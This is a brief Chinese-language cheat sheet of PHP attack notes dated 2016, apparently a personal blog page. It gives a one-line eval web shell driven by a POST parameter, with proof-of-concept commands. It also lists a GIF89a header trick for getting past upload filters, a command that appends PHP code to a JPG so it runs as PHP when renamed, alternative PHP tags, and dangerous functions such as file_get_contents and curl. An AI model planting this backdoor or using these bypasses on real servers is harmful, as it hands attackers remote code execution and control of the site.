---
title: "php"
date: 2016-01-25 14:15
---

## 一句话后门

```php
$cmd = $_POST['cmd'];                                                      
eval("$cmd;");

poc:
? cmd=echo phpinfo()  
? cmd=echo exec("ls -l")
```

## php 开关标签

php共有四种开关标签，如下两种总是有效的

```
<?php ?> 
<script language=”php”> </script>
```

另外两种需要在 php.ini 配置文件设置开或关

```
(“<?”, “?>”)
(“<%”,”%>”)
```

    
## upload

** bypass **

* 文件头+GIF89a



## dangerous functions

* file_get_contents()

> string file_get_contents ( string $filename [, bool $use_include_path = false [, resource $context [, int $offset = -1 [, int $maxlen ]]]] )

支持本地文件，HTTP，FTP

禁用file_get_contents,修改php.ini

```
allow_url_fopen=Off
```

* curl

支持 FTP(S),HTTP(S),TELNET,FILE,DICT,LDAP,GOPHER

install: sudo apt-get install php5-curl. then restart apache


## LDAP注入

[乌云 LDAP注入与防御][5]

[5]: http://drops.wooyun.org/tips/967

## 备注

* 注入php 到图片等

```
echo '<?php phpinfo();?>' >> 1.jpg
```

文件名后缀改为**.php**，就会用php方式解析，执行phpinfo().
